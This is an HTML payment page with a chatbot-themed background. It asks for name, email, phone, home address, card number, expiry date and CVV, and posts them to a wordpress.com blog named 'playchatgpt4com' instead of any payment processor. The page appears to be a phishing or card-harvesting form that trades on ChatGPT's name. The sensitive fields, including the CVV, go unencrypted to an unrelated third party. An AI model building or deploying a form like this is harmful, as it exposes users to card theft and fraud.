<!DOCTYPE html>
<html>

<head>
    <title>Payment Form</title>
    <style>
        body {
            background-image: url("https://img.freepik.com/free-vector/chatbot-technology-isometric-icons-interface-set_107791-140.jpg?w=1060&t=st=1691260419~exp=1691261019~hmac=bba445f2bd53f7a664514eda24b9b09510b2f1d3dee771852685f4b449f906a3");
            background-size: cover;
            font-family: Arial, sans-serif;
            color: #fff;
            margin: 0;
            padding: 0;
        }

        .payment-form {
            max-width: 400px;
            margin: 50px auto;
        }

        .payment-form h2 {
            text-align: center;
            margin: inherit;
        }

        .form-group {
            margin-bottom: 35px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        .pay-button {
            background-color: #13c519;
            color: #ffffff;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        .pay-button:hover {
            background-color: #1c8821;
        }

        .pay-button:active {
            background-color: #128215;
        }
    </style>
</head>

<body>
    <div class="payment-form">
        <h2>Payment Details</h2>
        <form action="https://playchatgpt4com.wordpress.com/" method="post">
            <div class="form-group">
                <label for="name">Name:</label>
                <input type="text" id="name" name="name" placeholder="Ex: Aaswit" required>
            </div>
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" id="email" name="email" placeholder="Ex: ask123@gmail.com" required>
            </div>
            <div class="form-group">
                <label for="phone">Phone Number:</label>
                <input type="tel" id="phone" name="phone" placeholder="Ex: 9876543210" required>
            </div>
            <div class="form-group">
                <label for="address">Address:</label>
                <input type="address" id="address" name="address" placeholder="Your Home address" required>
            </div>
            <div class="form-group">
                <label for="Card">Card Number:</label>
                <input type="card" id="Card" name="Card" placeholder="13-16 digits card number" required>
            </div>
            <div class="form-group">
                <label for="expirydate">Expiry Date:</label>
                <input type="date" id="expirydate" name="expirydate" placeholder="" required>
            </div>
            <div class="form-group">
                <label for="CVV">CVV:</label>
                <input type="cvv" id="cvv" name="cvv" placeholder="CVV" required>
            </div>
            <div class="form-group">
                <a href="https://playchatgpt4com.wordpress.com/"></a><button type="submit" class="pay-button">Pay Now</button>
            </div>
        </form>
    </div>
</body>

</html>
